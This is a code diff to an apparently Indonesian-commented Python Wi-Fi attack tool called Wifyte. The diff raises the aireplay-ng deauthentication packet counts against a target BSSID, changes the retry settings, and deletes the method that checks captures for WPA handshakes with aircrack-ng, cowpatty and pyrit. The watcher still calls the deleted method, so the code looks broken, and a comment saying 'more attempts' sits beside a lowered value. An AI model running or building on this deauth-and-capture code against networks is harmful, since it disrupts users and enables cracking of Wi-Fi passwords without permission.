@@ -327,7 +327,7 @@ class Wifyte:
         deauth_cmd1 = [
             "aireplay-ng",
             "--deauth",
-            "60",  # Lebih banyak paket deauth
+            "120",  # Lebih banyak paket deauth
             "-a",
             network.bssid,
             self.monitor_interface,
@@ -347,44 +347,10 @@ class Wifyte:
         print(f"{Colors.GREEN}[+] Deauth packets berhasil dikirim{Colors.ENDC}")
         return True
 
-    def check_for_handshake(self, cap_file: str) -> bool:
-        """Memeriksa file capture untuk handshake"""
-        if not os.path.exists(cap_file):
-            return False
-
-        # Metode 1: Menggunakan aircrack-ng
-        aircrack_result = self.execute_command(["aircrack-ng", cap_file])
-        if aircrack_result and "1 handshake" in aircrack_result.stdout:
-            return True
-
-        # Metode 2: Menggunakan cowpatty (jika tersedia) - verifikasi lebih akurat
-        cowpatty_path = shutil.which("cowpatty")
-        if cowpatty_path:
-            cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
-            if (
-                cowpatty_result
-                and "Collected all necessary data to mount crack against WPA"
-                in cowpatty_result.stdout
-            ):
-                return True
-
-        # Metode 3: Menggunakan pyrit (jika tersedia) - verifikasi lebih akurat lagi
-        pyrit_path = shutil.which("pyrit")
-        if pyrit_path:
-            pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
-            if (
-                pyrit_result
-                and "handshake(s)" in pyrit_result.stdout
-                and not "0 handshake(s)" in pyrit_result.stdout
-            ):
-                return True
-
-        return False
-
     def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
         """Thread untuk memantau file capture dan mengecek handshake"""
         cap_file = f"{capture_path}-01.cap"
-        check_interval = 0.5  # Cek setiap 0.5 detik
+        check_interval = 1  # Cek setiap 1 detik
 
         while not self.stop_capture:
             if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
@@ -439,7 +405,7 @@ class Wifyte:
         watcher_thread.start()
 
         # Strategi deauth yang lebih agresif
-        max_attempts = 8  # Lebih banyak percobaan
+        max_attempts = 5  # Lebih banyak percobaan
         attempt = 0
 
         try:
@@ -456,7 +422,7 @@ class Wifyte:
                         [
                             "aireplay-ng",
                             "--deauth",
-                            "30",
+                            "60",
                             "-a",
                             network.bssid,
                             self.monitor_interface,
@@ -479,7 +445,7 @@ class Wifyte:
                             [
                                 "aireplay-ng",
                                 "--deauth",
-                                "60",
+                                "120",
                                 "-a",
                                 network.bssid,
                                 self.monitor_interface,
